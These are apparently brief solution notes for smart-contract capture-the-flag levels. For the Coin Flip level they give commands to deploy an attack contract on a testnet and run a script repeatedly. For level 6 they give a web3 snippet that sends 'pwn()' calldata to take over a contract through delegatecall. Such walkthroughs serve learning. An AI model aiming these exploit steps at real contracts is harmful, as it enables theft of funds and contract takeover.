## 3 Coin Flip

Deploy the attack contract contract:

```
yarn hardhat ignition deploy ignition/modules/03CoinFlip.ts --network sepolia
```

Pick the adders of the contract, then go to the file .env there put the adderss of the contract of the chalenge in the variable
ADDRS_COINFLIP_OG and the adderss of the contract that you deploy before in the variable ADDRS_COINFLIP_ATTACK, afther this run the
scrip bellow 10 times;

```
yarn hardhat run src/03-coin-flip.ts
```

Finaly submit the answer

## 4

## 6

```
var pwned = web3.utils.keccak256("pwn()")

contract.sendTransaction({data:pwned})
```
